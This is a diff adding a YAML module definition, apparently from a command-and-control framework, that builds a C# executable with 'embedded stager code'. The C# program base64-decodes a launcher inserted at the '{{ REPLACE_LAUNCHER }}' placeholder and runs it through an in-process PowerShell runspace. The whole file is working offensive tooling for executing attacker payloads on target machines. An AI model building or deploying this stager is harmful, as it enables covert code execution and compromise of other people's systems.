@@ -1,0 +1,63 @@
+- Name: CSharpPS
+  Aliases: []
+  Description: Generate a PowerShell C# solution with embedded stager code that compiles to an exe
+  Author:
+      Name: Cx01N
+      Handle: Cx01N
+      Link: https://twitter.com/_Cx01N
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  - Net35
+  Code: |
+    using System;
+    using System.Text;
+    using System.Management.Automation;
+    using System.Management.Automation.Runspaces;
+
+    class Program
+    {
+          public static void Main(string[] args)
+          {
+
+            PowerShell ps = PowerShell.Create();
+
+            String script = "{{ REPLACE_LAUNCHER }}";
+            ps.AddScript(System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(script)));
+            try
+            {
+                ps.Invoke();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Error: " + e.Message.ToString());
+            }
+
+          }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+  EmbeddedResources: []
